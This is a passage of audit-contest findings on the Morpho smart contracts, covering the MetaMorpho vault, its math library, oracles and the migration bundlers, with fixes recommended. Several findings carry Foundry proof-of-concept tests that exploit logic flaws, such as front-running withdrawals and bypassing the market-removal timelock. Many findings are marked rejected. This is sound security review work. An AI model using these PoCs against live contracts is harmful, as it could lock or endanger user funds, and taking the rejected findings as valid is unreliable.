Once market is removed from withdrawQueue its asset should be sent to another live market so that totalAsset remains same



### `MetaMorpho` - withdraw actions might revert when transactions are front-run.	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
Withdraw actions would revert for users who try to withdraw maximum withdrawable amount but the transaction is front-run.

- Vulnerability Detail
The issue usually happens when markets' utilization is high(very likey) so that there are relatively less amount to withdraw compared to the supplied amount.
When users who have supplied more than the withdrawable liquidity, try to withdraw their assets, they will be using the amount from `maxWithdraw` function to withdraw available liquidity.
However when their transactions are front-run by other withdraw transactions, they will revert even though users want to withdraw all availabile liquidity as of transaction execution time.

- Impact
Since users' withdraw transactions are reverted until they are not front-run, it will cause loss of funds for users especially for heavy suppliers.
The issue becomes more serious when an accident happens with a vault and most of users try to withdraw their assets, heavy suppliers will not be able to have their assets back and might lose most of their assets because of the issue.

- Code Snippet
Here's a test case written in Foundry for PoC:
```Solidity
function testWithdraw() public {
    MarketParams memory market = allMarkets[0];
    address DOS = makeAddr("dos");

    // Submit supply cap
    vm.startPrank(CURATOR);
    this.submitCap(market, 1e4 * 1e18);
    vm.stopPrank();

    // Accept supply cap
    _forward(ConstantsLib.MIN_TIMELOCK);
    this.acceptCap(market.id());

    // Supplier deposits 1000(loanToken)
    vm.startPrank(SUPPLIER);
    loanToken.setBalance(SUPPLIER, 1e3 * 1e18);
    loanToken.approve(address(this), type(uint256).max);
    this.deposit(1e3 * 1e18, SUPPLIER);
    vm.stopPrank();

    // Another user who will cause DOS later deposits
    vm.startPrank(DOS);
    loanToken.setBalance(DOS, 1e18);
    loanToken.approve(address(this), type(uint256).max);
    this.deposit(1e18, DOS);
    vm.stopPrank();

    // Borrower borrows 800(loanToken)
    vm.startPrank(BORROWER);
    collateralToken.setBalance(BORROWER, 2e3 * 1e18);
    morpho.supplyCollateral(market, 2e3 * 1e18, BORROWER, "");
    morpho.borrow(market, 800e18, 0, BORROWER, BORROWER);
    vm.stopPrank();

    // Withdraw maxAmount, assumed to be 201(loanToken)
    uint256 withdrawAmount = this.maxWithdraw(SUPPLIER);
    assertEq(withdrawAmount, 201e18);

    // Front-run withdraw tx
    vm.startPrank(DOS);
    this.withdraw(1, DOS, DOS); // Withdraw 1 wei
    vm.stopPrank();

    // Withdraw
    vm.startPrank(SUPPLIER);
    vm.expectRevert(ErrorsLib.NotEnoughLiquidity.selector);
    this.withdraw(withdrawAmount, SUPPLIER, SUPPLIER);
    vm.stopPrank();
}
```

Result of running the test:
```bash
Running 1 test for test/forge/AuditTest.sol:AuditTest
[PASS] testWithdraw() (gas: 803240)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.62ms    

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- Tools Used
Manual Review, Foundry

- Recommendation
Accept `type(uint256).max` as a vaule in `withdraw` function which will withdraw all available liquidity as of transaction execution time.

```Solidity
function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
    uint256 newTotalAssets = _accrueFee();

    // Add this part
    if (assets == type(uint256).max) {
        (assets,,) = _maxWithdraw(owner);
    }

    // Do not call expensive `maxWithdraw` and optimistically withdraw assets.

    shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Ceil);

    // `newTotalAssets - assets` may be a little off from `totalAssets()`.
    _updateLastTotalAssets(newTotalAssets.zeroFloorSub(assets));

    _withdraw(_msgSender(), receiver, owner, assets, shares);
}
```



### Reallocation of funds can revert because of rounding 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L445-L445](metamorpho/src/MetaMorpho.sol#L445-L445)

- Description
The *Morphoblue.reallocate()* function reallocates funds from different markets. It can withdraw or deposit funds in the given markets. In the end of the reallocation process, the withdrawn funds have to be equal to the deposited funds. The problem is that the total withdrawn funds are calculated using the return value from MORPHO.withdraw():

```solidity
                (uint256 withdrawnAssets, uint256 withdrawnShares) = MORPHO.withdraw(
                    allocation.marketParams,
                    withdrawn,
                    shares,
                    address(this),
                    address(this)
                );

                emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

                totalWithdrawn += withdrawnAssets;
```

Morpho uses toAssetsDown to return the assets: 
```solidity 
else assets = shares.toAssetsDown(market[id].totalSupplyAssets, market[id].totalSupplyShares); 
```

This means that totalWithdrawn funds may not be equal to totalSupplied in the end of the reallocation even though an equal amount of assets was reallocated (ignoring some potential dust amount). This will make the reallocation impossible.

- Recommendation

Update the totalWithdrawn with **withdrawn** which is not rounded, instead of with withdrawnAssets.

```diff
  -            totalWithdrawn += withdrawnAssets;
  +            totalWithdrawn += withdrawn;
```



### The ALLOCATOR can remove a market without the CURATOR's request by calling submitMarketRemoval().	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The ALLOCATOR can remove a market without the CURATOR's request by calling submitMarketRemoval(). 

The protocol implements a separation of duty principle for market removal: 
In order to remove a market, the CURATOR needs to call ``submitMarketRemoval()`` to submit a request to remove a market and then the ALLOCATOR calls ``updateWithdrawQueue()`` to remove the market with proper condition (supply = 0). The constraint is that unless 
it is initiated by the CURATOR by the explicit call of submitMarketRemoval(), a market should not be removable.  

However, such protection can be bypassed by the ALLOCATOR: when the CURATOR set a market cap for market0 to zero, then the ALLOCATOR can call reallocate() to move supplies to other markets and then delete market0 by calling updateWithdrawQueue(), even without the permission of the ALLOCATOR, that is, without the calling of submitMarketRemoval(). 

The main issue is the following code has a logic problem: it checks the existence of the market removal request only when the supply != 0, that is, if the supply of the market is zero, such as after reallocation, then the check of the existence of the market removal request will be by passed. 

```javascript
   if (MORPHO.supplyShares(id, address(this)) != 0) { 
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id); // not removable

                    if (block.timestamp < config[id].removableAt) {        // not time yet
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }
```


The following POC confirms my finding: 

1) The CURATOR sets the cap for market0 to 0;
2) The ALLOCATOR calls  reallocate()  to move all supplises from market0 to the rest. 
3)  The ALLOCATOR calls updateWithdrawQueue() to remove market0 successfully.

```javascript
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IERC20Errors} from "../../lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";
import {IMorphoFlashLoanCallback} from "../../lib/morpho-blue/src/interfaces/IMorphoCallbacks.sol";

import "./helpers/IntegrationTest.sol";

contract MyTest is IntegrationTest, IMorphoFlashLoanCallback {
    using MorphoBalancesLib for IMorpho;
    using MorphoLib for IMorpho;
    using MarketParamsLib for MarketParams;

    Id[] marketIds = new Id[](3);

    function setUp() public override virtual {
        super.setUp();                          // the first is an idle market?
        _setFee(0.1e18);

 
        for(uint256 i; i < 3; i++){        // use the first three markets
             _setCap(allMarkets[i], (i+1) * 1e18);
             marketIds[i] = allMarkets[i].id();
        }

        vm.prank(ALLOCATOR);
        vault.setSupplyQueue(marketIds);
        
        // _sortSupplyQueueIdleLast();
        console2.log("vault supply queue length:", vault.supplyQueueLength());
        console2.log("vault withdraw queue length:", vault.withdrawQueueLength());
    }

    
    function onMorphoFlashLoan(uint256, bytes memory) external {
        assertEq(vault.maxWithdraw(ONBEHALF), 0);
    }
    

    function testRemoveMarket() public{
        // we start with three markets, markete0, market1, market2
        assertEq(vault.withdrawQueueLength(), 3);

        // 1. SUPPLIER supplies 3.3e18
        uint256 assets = 3.3e18; // 1 for market 0, 2, for market 1, and 0.3 for market 2
        uint256 shares = vault.convertToShares(assets);
        loanToken.setBalance(SUPPLIER, assets);
        vm.prank(SUPPLIER);
        uint256 deposited = vault.mint(shares, SUPPLIER);

        // 2. CURATOR set the cap for market0 to zero
        vm.prank(CURATOR);        
        vault.submitCap(allMarkets[0], 0); // this will be in effect immediately
        assertEq(vault.config(marketIds[0]).cap, 0);
 
       // 3. ALLOCATOR reallocate supplies from market0 to the rest
       MarketAllocation[] memory alloc = new MarketAllocation[](3);
       alloc[0].marketParams = allMarkets[0];
       alloc[0].assets = 0;
       alloc[1].marketParams = allMarkets[1];
       alloc[1].assets = 2e18; // keep it as it is
       alloc[2].marketParams = allMarkets[2];
       alloc[2].assets = type(uint256).max;
       vm.prank(ALLOCATOR);  
       vault.reallocate(alloc);

       //. 4. ALLOCATOR removes market0
       uint256[] memory indexes = new uint256[](2);
       indexes[0]  = 1;
       indexes[1]  = 2;
       vm.prank(ALLOCATOR);  
       vault.updateWithdrawQueue(indexes);
          
       // Now market0 has been removed.
       assertEq(vault.withdrawQueueLength(), 2);  
    }
}

```
 

**Recommendation**:
When removing a market: 1) check wether the cap is zero; 2) check wether the supply is zero; 3) check wether the request of market removal exists, and the timelock has expired. 



### Pending cap may push a previously removed market back to the withdrawQueue

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description
In MetaMorpho, there is a withdrawQueue which stores the ids of the markets that users can withdraw from. In order to remove a market from this queue, the allocator has to call *MetaMorpho.updateWithdrawQueue()*. The market to be removed, has to have its market cap set to 0.
The problem is that the already pending cap is not cleared. 

Consider the following scenario:
   1. Market cap is set to 0.
   2. A pending market cap for a greater value is submitted. 
   3. The owners of the MetaMorpho instance, specifically the allocator, decides that the given market is no longer a good option, and removes it from the withdraw queue.
   4. The timelock timestamp is passed, and *Metamorpho.acceptCap()* can be called.
   5. *Metamorpho.acceptCap()* can be called by anyone because it does not have an access control modifier. It will set the market cap value to whatever is in the pending cap. Then, the market will be pushed back to the withdrawQueue, as if the allocator never removed it. This can cause problems in the risk management model.

Here is **Metamorpho.acceptCap()**:
```solidity
    function acceptCap(Id id) external afterTimelock(pendingCap[id].validAt) {
        // Safe "unchecked" cast because pendingCap <= type(uint184).max.
        _setCap(id, uint184(pendingCap[id].value));
    }
```

- Foundry PoC
Run this test in **MarketTest.sol**
```solidity
    function testCapOverriding() public {
        vm.prank(CURATOR);
        // The idle market is at 0 position in the withdraw queue
        vault.submitCap(idleParams, 0);

        // The withdraw queue has 4 elements, let's prove that
        assertEq(vault.withdrawQueueLength(), 4);
        // We want to remove only the idle market, so we will leave 1, 2 and 3
        uint256[] memory indexes = new uint256[](3);
        indexes[0] = 1;
        indexes[1] = 2;
        indexes[2] = 3;

        // The CURATOR submit a new pending cap for the idle market
        vm.prank(CURATOR);
        vault.submitCap(idleParams, 100e18);

        // Since the current market cap is 0, the ALLOCATOR is able to successfully
        vm.prank(ALLOCATOR);
        vault.updateWithdrawQueue(indexes);

        // Length should be 3 now, since the idle market is removed
        assertEq(vault.withdrawQueueLength(), 3);

        // The time lock passes
        vm.warp(block.timestamp + TIMELOCK);
        // Anybody is now able to set the new cap
        vault.acceptCap(idleParams.id());

        // Since the cap has been set to a non-zero value, the market is back in the withdraw queue
        assertEq(vault.withdrawQueueLength(), 4);
    }
```
- Recommendation
When removing a market from the queue, **delete** its pending cap.
```diff
        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

+               delete pendingCap[id];
                delete config[id];
            }
        }
```



### Pending cap may push a previously removed market back to the withdrawQueue

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L346-L385](metamorpho/src/MetaMorpho.sol#L346-L385)

- Description
In MetaMorpho, there is a withdrawQueue which stores the ids of the markets that users can withdraw from. In order to remove a market from this queue, the allocator has to call *MetaMorpho.updateWithdrawQueue()*. The market to be removed, has to have its market cap set to 0.
The problem is that the already pending cap is not cleared. 

Consider the following scenario:
   1. Market cap is set to 0.
   2. A pending market cap for a greater value is submitted. 
   3. The owners of the MetaMorpho instance, specifically the allocator, decides that the given market is no longer a good option, and removes it from the withdraw queue.
   4. The timelock timestamp is passed, and *Metamorpho.acceptCap()* can be called.
   5. *Metamorpho.acceptCap()* can be called by anyone because it does not have an access control modifier. It will set the market cap value to whatever is in the pending cap. Then, the market will be pushed back to the withdrawQueue, as if the allocator never removed it. This can cause problems in the risk management model.

Here is **Metamorpho.acceptCap()**:
```solidity
    function acceptCap(Id id) external afterTimelock(pendingCap[id].validAt) {
        // Safe "unchecked" cast because pendingCap <= type(uint184).max.
        _setCap(id, uint184(pendingCap[id].value));
    }
```

- Foundry PoC
Run this test in **MarketTest.sol**
```solidity
    function testCapOverriding() public {
        vm.prank(CURATOR);
        // The idle market is at 0 position in the withdraw queue
        vault.submitCap(idleParams, 0);

        // The withdraw queue has 4 elements, let's prove that
        assertEq(vault.withdrawQueueLength(), 4);
        // We want to remove only the idle market, so we will leave 1, 2 and 3
        uint256[] memory indexes = new uint256[](3);
        indexes[0] = 1;
        indexes[1] = 2;
        indexes[2] = 3;

        // The CURATOR submit a new pending cap for the idle market
        vm.prank(CURATOR);
        vault.submitCap(idleParams, 100e18);

        // Since the current market cap is 0, the ALLOCATOR is able to successfully
        vm.prank(ALLOCATOR);
        vault.updateWithdrawQueue(indexes);

        // Length should be 3 now, since the idle market is removed
        assertEq(vault.withdrawQueueLength(), 3);

        // The time lock passes
        vm.warp(block.timestamp + TIMELOCK);
        // Anybody is now able to set the new cap
        vault.acceptCap(idleParams.id());

        // Since the cap has been set to a non-zero value, the market is back in the withdraw queue
        assertEq(vault.withdrawQueueLength(), 4);
    }
```
- Recommendation
When removing a market from the queue, **delete** its pending cap.
```diff
        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

+               delete pendingCap[id];
                delete config[id];
            }
        }
```



### Potential Division by Zero in wDivDown Function, Risk of Runtime Error	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Severity**

Medium

**Relevant GitHub Links**

https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L18

**Summary**

The "Potential Division by Zero in `wDivDown` Function" issue highlights a risk in the library `MathLib` function, where a division by zero may occur if the variable `b` is zero. This poses a risk of a runtime error and, while not critical, necessitates attention to prevent potential disruptions to the functionality.

**Vulnerability Details**

Risk of division by zero in the `wDivDown` function, potentially leading to a runtime error if the variable `b` is zero.

**Impact**

May result in a runtime error, potentially affecting the contract's functionality, if division by zero occurs in the `wDivDown` function.

**Tools used**

- Manual review

**Recommendations**

Ensure that the `b` parameter is always non-zero to avoid this issue.

```solidity
function wDivDown(int256 a, int256 b) internal pure returns (int256) {
    require(b != 0, "MathLib: division by zero");
    return a * WAD_INT / b;
}
```



### Integer Overflow/Underflow Risk in Multiplication, Potential Arithmetic Issues, Emphasizing Input Safety	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Severity**

MEDIUM

**Relevant GitHub Links**

1) https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L14

**Summary**

Risk of integer overflow or underflow in multiplication operations (a * b), emphasizing the importance of ensuring safe input ranges to prevent arithmetic issues

**Vulnerability Details**

Potential integer overflow or underflow in multiplication operations (a * b) due to insufficient input range validation.

**Impact**

May result in unexpected behavior or arithmetic issues if integer overflow or underflow occurs in multiplication operations (a * b).

**Tools used**

- Manual review

**Recommendations**

This modified code includes input validation checks to ensure safe multiplication and division, preventing integer overflow, underflow, and division by zero issues.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {WAD} from "../../lib/morpho-blue/src/libraries/MathLib.sol";

int256 constant WAD_INT = int256(WAD);

/// @title MathLib
/// @author Morpho Labs
/// @custom:contact security@morpho.org
/// @notice Library to manage fixed-point arithmetic on signed integers.
library MathLib {
    function wMulDown(int256 a, int256 b) internal pure returns (int256) {
        // Ensure safe multiplication by validating input ranges
        require(a >= type(int256).min / b && a <= type(int256).max / b, "Multiplication would cause overflow/underflow");
        return a * b / WAD_INT;
    }

    function wDivDown(int256 a, int256 b) internal pure returns (int256) {
        // Ensure safe division by validating input ranges and avoiding division by zero
        require(b != 0, "Division by zero");
        require(a >= type(int256).min * WAD_INT / b && a <= type(int256).max * WAD_INT / b, "Division would cause overflow/underflow");
        return a * WAD_INT / b;
    }
}
```



### ERC4626Bundler.erc4626Deposit() checks the maxDeposit of the receiver instead of msg.sender 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
ERC4626Bundler.erc4626Deposit() checks the maxDeposit of the receiver instead of ``address(this)``. As a result, the user bypass the maxDeposit check since the user can change the ``receiver`` each time calling this function. 

```javascript
   function erc4626Deposit(address vault, uint256 assets, uint256 minShares, address receiver)
        external
        payable
        protected
    {
        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);
        /// Do not check `receiver != address(this)` to allow the bundler to receive the vault's shares.

        address asset = IERC4626(vault).asset();

        assets = Math.min(assets, IERC4626(vault).maxDeposit(receiver));
        assets = Math.min(assets, ERC20(asset).balanceOf(address(this)));

        require(assets != 0, ErrorsLib.ZERO_AMOUNT);

        _approveMaxTo(asset, vault);

        uint256 shares = IERC4626(vault).deposit(assets, receiver);
        require(shares >= minShares, ErrorsLib.SLIPPAGE_EXCEEDED);
    }
```

Similar problem for ERC4626Bundler.erc4626Mint(). The check should be on maxMint(address(this)) instead of maxMint(receiver).

**Recommendation**:
One should check the  maxDeposit of the msg.sender instead:

```diff
   function erc4626Deposit(address vault, uint256 assets, uint256 minShares, address receiver)
        external
        payable
        protected
    {
        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);
        /// Do not check `receiver != address(this)` to allow the bundler to receive the vault's shares.

        address asset = IERC4626(vault).asset();

-        assets = Math.min(assets, IERC4626(vault).maxDeposit(receiver));
+        assets = Math.min(assets, IERC4626(vault).maxDeposit(address(this));


        assets = Math.min(assets, ERC20(asset).balanceOf(address(this)));

        require(assets != 0, ErrorsLib.ZERO_AMOUNT);

        _approveMaxTo(asset, vault);

        uint256 shares = IERC4626(vault).deposit(assets, receiver);
        require(shares >= minShares, ErrorsLib.SLIPPAGE_EXCEEDED);
    }
```



### Missing Sequencer Check in Chainlink Feeds	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Severity**

Medium

**Relevant GitHub Links**

https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/libraries/ChainlinkDataFeedLib.sol#L20

**Summary**

The `getPrice` function in the `ChainlinkDataFeedLib` library does not include a check for the status of the Arbitrum Layer 2 sequencer when interacting with a Chainlink-compliant feed. This absence of a sequencer check could result in the utilization of outdated or stale prices, especially when the protocol is deployed on Layer 2 blockchains. 

**Vulnerability Details**

The `getPrice` function fetches the latest price from the provided Chainlink feed without verifying if the Arbitrum Layer 2 sequencer is operational. The lack of this check poses a potential risk of using inaccurate prices during sequencer downtime.

**Impact**

The price is utilized in the liquidation function and position health checks. If the reported price is below the actual price, users can strategically avoid liquidations

**Tools used**

- Manual review

**Recommendations**

It is recommended to implement a check for the Arbitrum Layer 2 sequencer's status within the `getPrice` function. This check will help ensure that the prices obtained from the Chainlink feed are valid and not outdated, especially when the protocol is deployed on Layer 2 blockchains. Following the example code provided by Chainlink for handling L2 sequencer feeds is advised.

https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code

**Note to Judge:**

I submitted this finding after seeking clarification from the protocol team regarding the deployment of the contract. The team responded  "Mainnet first but it might be deployed on other EVM compatible chains. We don’t yet which one though". So if team is planning to deploy on L2s like **Arbitrum** then they should be aware of the recommendations I mentioned.



### Cannot use `uint256.max` to repay the balance of `AaveV2MigrationBundler`

**Severity:** Medium risk

**Context:** [AaveV2MigrationBundler.sol#L40-L40](morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol#L40-L40)

**Description**: The `aaveV2Repay`'s natspec states the following for the `amount` parameter:

> The amount of `asset` to repay. Pass `type(uint256).max` to repay the bundler's `asset` balance.

Passing  `type(uint256).max` to repay the bundler's `asset` balance does not work. Note that if `amount == type(uint256).max`, this value is _not_ adjusted and just forwarded to the `AAVE_V2_POOL.repay` call.

Aave will execute [this code](https://github.com/aave/protocol-v2/blob/ce53c4a8c8620125063168620eba0a8a92854eb8/contracts/protocol/lendingpool/LendingPool.sol#L257-L262):

```solidity
uint256 paybackAmount =
  interestRateMode == DataTypes.InterestRateMode.STABLE ? stableDebt : variableDebt;

// not executed as params.amount = type(uint256).max
// meaning paybackAmount will stay at entire `variableDebt`
if (amount < paybackAmount) {
  paybackAmount = amount;
}
```

This caps the amount to be repaid to the **entire borrow balance**, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.

**Example**: A user tries to migrate part of their position by trying to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to "repay the bundler's `asset` balance", as defined by the natspec. The batch will revert as Aave V2 will try to repay the entire borrow balance of 1000 but the bundler only has 500 assets.

**Recommendation**: Consider always capping the `amount` to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:

```diff
- if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
+ amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
```



### Cannot use `uint256.max` to repay the balance of `AaveV3MigrationBundler`

**Severity:** Medium risk

**Context:** [AaveV3MigrationBundler.sol#L37-L37](morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol#L37-L37)

**Description**: The `aaveV3Repay`'s natspec states the following for the `amount` parameter:

> The amount of `asset` to repay. Pass `type(uint256).max` to repay the bundler's `asset` balance.

Passing  `type(uint256).max` to repay the bundler's `asset` balance does not work. Note that if `amount == type(uint256).max`, this value is _not_ adjusted and just forwarded to the `AAVE_V3_POOL.repay` call.

AaveV3 will execute [this code](https://github.com/aave/aave-v3-core/blob/6070e82d962d9b12835c88e68210d0e63f08d035/contracts/protocol/libraries/logic/BorrowLogic.sol#L204):

```solidity
uint256 paybackAmount = params.interestRateMode == DataTypes.InterestRateMode.STABLE
  ? stableDebt
  : variableDebt;

// note that useATokens is false for repay and this is not executed
if (params.useATokens && params.amount == type(uint256).max) {
  params.amount = IAToken(reserveCache.aTokenAddress).balanceOf(msg.sender);
}

// not executed either as params.amount = type(uint256).max
// meaning paybackAmount will stay at entire `variableDebt`
if (params.amount < paybackAmount) {
  paybackAmount = params.amount;
}
```

Note that [`useATokens` is `false`](https://github.com/aave/aave-v3-core/blob/6070e82d962d9b12835c88e68210d0e63f08d035/contracts/protocol/pool/Pool.sol#L265) for repays. This caps the amount to be repaid to the **entire borrow balance**, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.

**Example**: A user tries to migrate part of their position by trying to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to "repay the bundler's `asset` balance", as defined by the natspec. The batch will revert as Aave V3 will try to repay the entire borrow balance of 1000 but the bundler only has 500 assets.

**Recommendation**: Consider always capping the `amount` to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:

```diff
- if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
+ amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
```



### Cannot use `uint256.max` to repay the balance of `AaveV3OptimizerMigrationBundler`

**Severity:** Medium risk

**Context:** [AaveV3OptimizerMigrationBundler.sol#L37-L37](morpho-blue-bundlers/src/migration/AaveV3OptimizerMigrationBundler.sol#L37-L37)

**Description**: The `aaveV3OptimizerRepay`'s natspec states the following for the `amount` parameter:

> The amount of `underlying` to repay. Pass `type(uint256).max` to repay the bundler's `underlying`

Passing  `type(uint256).max` to repay the bundler's `underlying` balance does not work. Note that if `amount == type(uint256).max`, this value is _not_ adjusted and just forwarded to the `AAVE_V3_OPTIMIZER.repay` call.

AaveV3Optimizier will [forward the calls](https://vscode.blockscan.com/ethereum/0x33333aea097c193e66081E930c33020272b33333) to [Morpho's PositionManager](https://vscode.blockscan.com/ethereum/0xCEcc755730904b3A6c20CE9aABA181Aa4593F869) which executes:

```solidity
// AaveV3Optimizer
function _repay(address underlying, uint256 amount, address from, address onBehalf) internal returns (uint256) {
    bytes memory returnData = _positionsManager.functionDelegateCall(
        abi.encodeCall(IPositionsManager.repayLogic, (underlying, amount, from, onBehalf))
    );

    return (abi.decode(returnData, (uint256)));
}

// PositionManager
function repayLogic(address underlying, uint256 amount, address repayer, address onBehalf)
external
returns (uint256)
{
  amount = Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount);
}
```

This caps the amount to be repaid to the **entire borrow balance**, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.

**Example**: A user tries to migrate part of their position by trying to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to "repay the bundler's `asset` balance", as defined by the natspec. The batch will revert as AaveV3Optimizer will try to repay the entire borrow balance of 1000 but the bundler only has 500 assets.

**Recommendation**: Consider always capping the `amount` to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:

```diff
- if (amount != type(uint256).max) amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
+ amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
```



### Cannot use `uint256.max` to repay the balance of `CompoundV2MigrationBundler`

**Severity:** Medium risk

**Context:** [CompoundV2MigrationBundler.sol#L40-L40](morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol#L40-L40)

**Description**: The `compoundV2Repay`'s natspec states the following for the `amount` parameter:

> The amount of `cToken` to repay. Pass `type(uint256).max` to repay all (except for cETH).

It's ambiguous what "all" refers to, the bundler's token balance, or the borrow balance. We assume the bundler's balance as that's the approach taken by the other bundlers. Passing  `type(uint256).max` to repay the bundler's `cToken` balance does not work. Note that if `amount == type(uint256).max`, this value is _not_ adjusted and just forwarded to the `ICToken(cToken).repayBorrowBehalf` call.

CompoundV2 will execute [this code](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L659):

```solidity
/* We fetch the amount the borrower owes, with accumulated interest */
uint accountBorrowsPrev = borrowBalanceStoredInternal(borrower);

/* If repayAmount == -1, repayAmount = accountBorrows */
uint repayAmountFinal = repayAmount == type(uint).max ? accountBorrowsPrev : repayAmount;
```

This caps the amount to be repaid to the **entire borrow balance**, not to the bundler's balance. The call will revert as it tries to repay the entire borrow balance with the bundler's balance.

**Example**: A user tries to migrate part of their position by trying to repay half of their borrow balance of 1000 assets. The first action in the bundle redeems shares from another protocol to receive the desired repay amount of roughly 500 assets, and the second action is to repay by setting `assets = type(uint256).max` to "repay the bundler's `asset` balance", as defined by the natspec. The batch will revert as Aave V2 will try to repay the entire borrow balance of 1000 but the bundler only has 500 assets.

**Recommendation**: Consider always capping the `amount` to the bundler's balance. Trying to repay more will never work, and the protocol itself will already cap it to the entire borrow balance:

```diff
- if (amount != type(uint256).max) amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
+ amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
```



### `ICToken(cToken).repayBorrowBehalf` return value not checked	_(duplicate of [Missing important check if `repay` and `redeem` functions in `CompoundV2MigrationBundler.sol` are successful])_

**Severity:** Medium risk

**Context:** [CompoundV2MigrationBundler.sol#L57-L57](morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol#L57-L57)

**Description**: The `ICToken(cToken).repayBorrowBehalf` function returns a [`uint256` error value](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CErc20.sol#L100). See its definition and natspec:

```solidity
/**
 * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
 */
function repayBorrowBehalf(address borrower, uint repayAmount) override external returns (uint) {
}
```

This return value is not checked in `CompoundV2MigrationBundler.compoundV2Repay`:

```
ICToken(cToken).repayBorrowBehalf(initiator(), amount);
```

While it currently always returns `NO_ERROR`, this is an implementation detail of the current contract code and the [cTokens are upgradeable](https://www.comp.xyz/t/managing-ctoken-versions/1220) which means it should be checked. Otherwise, user funds can be lost when the repay silently fails with a non-zero error code and the balance remains in the bundler. Anyone can then take the tokens from the bundler.

**Recommendation**: Check that the return value of `repayBorrowBehalf` is `0`.



### `ICToken(cToken).compoundV2Redeem` return value not checked	_(duplicate of [Missing important check if `repay` and `redeem` functions in `CompoundV2MigrationBundler.sol` are successful])_

**Severity:** Medium risk

**Context:** [CompoundV2MigrationBundler.sol#L72-L72](morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol#L72-L72)

**Description**: The `ICToken(cToken).compoundV2Redeem` function returns a [`uint256` error value](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CErc20.sol#L58). See its definition and natspec:

```solidity
/**
